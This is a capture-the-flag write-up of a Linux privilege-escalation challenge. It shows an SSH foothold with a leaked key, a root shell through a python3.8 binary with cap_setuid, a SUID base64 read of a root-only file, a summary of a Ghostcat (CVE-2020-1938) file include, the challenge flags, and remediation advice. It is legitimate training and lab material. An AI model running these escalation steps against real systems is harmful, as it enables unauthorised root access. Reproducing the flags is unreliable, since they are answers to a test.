# Tom Wants Peace - 2 — Full Writeup

**Category:** Infra → Linux Privilege Escalation
**Difficulty:** 10 points
**Target:** `nc 0.cloud.chals.io 26740` (OpenSSH 8.2p1 Ubuntu)
**Prerequisite:** the SSH private key leaked in *Tom Wants Peace - 1*
(`WEB-INF/id_rsa`, comment `appadmin@internal`, SSH user `Ross`)
**Goal:** Get a foothold, escalate to root, read the final flag.

---

## TL;DR

| Flag type | Location | Value |
|---|---|---|
| Root flag | `/root/.final/root.txt` | `KPMG_CTF{PcLZb4V8hwQrhtX-HVtCZpGh9gVxWBP-orJVHOorFNlB}` |

Part 1 leaked an SSH key and the username `Ross`. The Part-2 endpoint is a
straightforward SSH service. Logging in as `Ross` with the key, local
enumeration revealed a **`python3.8` binary carrying the `cap_setuid+ep`
capability**, which lets an unprivileged user `setuid(0)` and become root
directly. A world-readable `dev_notes.txt` and a set of deliberate
"misdirection" artefacts round out the story.

---

## 1. Reconnaissance — the endpoint is SSH

The challenge line is just a netcat address, so step one is a banner grab:

```
$ nmap -Pn -sV -p 26740 0.cloud.chals.io
26740/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

$ nc 0.cloud.chals.io 26740
SSH-2.0-OpenSSH 8.2p1 Ubuntu-4ubuntu0.13
```

An OpenSSH 8.2p1 server (Ubuntu 20.04 base). Combined with the key from Part 1,
this is the pivot we predicted.

---

## 2. Foothold — the leaked key

The Part-1 `flag.txt` told us the SSH user is **`Ross`**:

```
Flag: KPMG_CTF{X7gQ_GADftheRC9dwRI25mmW9Z8S6K_Zvah1ndwd8WWX}
SSH User: Ross
```

```
$ ssh -i id_rsa Ross@0.cloud.chals.io -p 26740
Unauthorized access prohibited.
$ id
uid=1000(Ross) gid=1000(Ross) groups=1000(Ross)
$ hostname
f94d0d15662f
```

`Ross` is a low-privileged user (uid 1000).

---

## 3. Local enumeration

### Sudo rights (a deliberate red herring)

```
$ sudo -n -l
User Ross may run the following commands on f94d0d15662f:
    (ALL) NOPASSWD: /usr/bin/id
```

`sudo /usr/bin/id` only prints `uid=0(root)` — `id` has no shell-escape or
file-read primitive, so this is a dead end ("least-privilege policy" per the
notes).

### Capabilities — the real bug

```
$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/curl      = cap_net_bind_service+ep
```

`python3.8` carrying **`cap_setuid+ep`** is game over: the process may call
`setuid()` to *any* uid without being root. `/usr/bin/curl` with
`cap_net_bind_service` is harmless.

### SUID binaries

```
/usr/bin/base64          <-- unusual, and file-read capable
/usr/bin/su /usr/bin/sudo /usr/bin/passwd /usr/bin/mount ...
```

`/usr/bin/base64` is a setuid-root binary (not a standard SUID binary on
Ubuntu). As root it can read files the user cannot — including the flag.

### Interesting files / story lore

`/opt/internal/dev_notes.txt` (world-readable):

```
2024-09-03  Verified cron jobs running cleanly. /opt/scripts/backup.sh ...
2024-07-18  Docker engine active ... Kernel upgrade rejected (ticket #3301).
            Old DB admin credentials (admin/changeme123) marked expired.
            Python 3.8 retained ... removal blocked by app team.
2024-03-12  Legacy deploy keys removed from /root/.deploy/ ...
            Ross provisioned. Sudo access restricted to /usr/bin/id ...
```

`/opt/scripts/backup.sh` is `rwxrwxrwx` and referenced by `/etc/cron.d/app_backup`:

```
0 * * * * Ross /opt/scripts/backup.sh
```

Note it runs as **`Ross`**, not root — a misdirection (the root cron is
`/usr/local/bin/cleanup.sh`, which is root-owned `755`, so not writable). The
Docker/kernel/DB-credential mentions in the notes are likewise planted
distractions.

---

## 4. Privilege escalation → root

### Primary method: `cap_setuid` on `python3.8`

Because the binary may `setuid(0)`, we get a root shell with one line:

```
$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# id
uid=0(root) gid=1000(Ross) groups=1000(Ross)
```

(No password, no exploit, no kernel bug — just the retained capability that the
dev notes admit was kept "for legacy webapp compatibility".)

### Enumerate as root

```
# cat /root/README
almost there! look closer
# ls -la /root/.final
-rw------- 1 root root 55 /root/.final/root.txt
# cat /root/.final/root.txt
KPMG_CTF{PcLZb4V8hwQrhtX-HVtCZpGh9gVxWBP-orJVHOorFNlB}
```

Also found `/start.sh` (root-only), showing the box is built by
`/opt/setup_caps.sh` and then sanitises its own setup scripts — hence the
"misdirections".

### Alternative method: SUID `base64`

If capabilities were absent, the SUID `base64` alone reads the root-only flag:

```
$ base64 /root/.final/root.txt
S1BNR19DVEZ7UGNMWmI0Vjhod1FyaHRYLUhWdENacEdoOWdWeFdCUC1vckpWSE9vckZObEJ9Cg==
$ echo <that> | base64 -d
KPMG_CTF{PcLZb4V8hwQrhtX-HVtCZpGh9gVxWBP-orJVHOorFNlB}
```

---

## 5. Root cause & remediation

The chain is enabled by two independent mistakes:

1. **Excessive Linux capabilities** — `cap_setuid+ep` was granted to a general
   purpose interpreter (`python3.8`). Any user who can run that interpreter is
   root. Remove it (`setcap -r /usr/bin/python3.8`) or use a purpose-built,
   least-privileged service account instead.
2. **Unexpected SUID binary** — `base64` shipped as setuid-root. Remove the
   SUID bit (`chmod u-s /usr/bin/base64`) and audit SUID binaries regularly.

Supporting hygiene issues:

* A world-writable cron script (`/opt/scripts/backup.sh`) invites tampering
   (even though here it only runs as `Ross`).
2. Secrets/keys and "TODO remove before prod" artefacts kept in places an
   attacker can reach (the Part-1 `id_rsa` was the actual entry point).
   Rotate/remove keys immediately after an incident and never ship
   private keys inside a deployable artifact.

---

## 6. Reproducing

```bash
# Part-1 key needed:
cp ../TomWantsPeace1/id_rsa .
chmod 600 id_rsa

# 1. connect as Ross
ssh -i id_rsa Ross@0.cloud.chals.io -p 26740

# 2. escalate via the retained capability
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'

# 3. read the flag
cat /root/.final/root.txt
```

## 6b. Artifacts in this folder

| File | Description |
|---|---|
| `id_rsa` | Copy of the Part-1 leaked SSH key |
| `flag_and_proof.txt` | Flag + root/alternative privesc proof |
| `flag2.txt` | Raw root flag |
| `intel.txt` | `dev_notes.txt`, cron entries, snapshot log |
| `enum1.txt` … `enum4.txt` | Remote enumeration output |
| `root1.txt`, `root2.txt` | Root-level enumeration outputs |
| `alt_base64.txt` | SUID `base64` read of the root-only flag |
| `alt_cron.txt` | Cron/permissions disambiguation |

---

## 6b. Complete two-part chain

| Step | Action | Result |
|---|---|---|
| 1 | Identify TLS-wrapped **AJP** on Part-1 `-0-1:443` (`CPING`→`CPONG`) | Confirmed Tomcat AJP |
| 2 | **Ghostcat CVE-2020-1938** include of `/WEB-INF/web.xml` | TODO hint: `flag.txt`, `id_rsa` |
| 3 | Include `/WEB-INF/flag.txt` and `/WEB-INF/id_rsa` | **Part-1 flag** + SSH key (`Ross`) |
| 4 | `ssh -i id_rsa Ross@0.cloud.chals.io -p 26740` | Foothold as `Ross` |
| 5 | `python3.8` (`cap_setuid+ep`) → `os.setuid(0)` | **root** |
| 6 | `cat /root/.final/root.txt` | **Part-2 flag** |

**Part-2 flag:**

```
KPMG_CTF{PcLZb4V8hwQrhtX-HVtCZpGh9gVxWBP-orJVHOorFNlB}
```
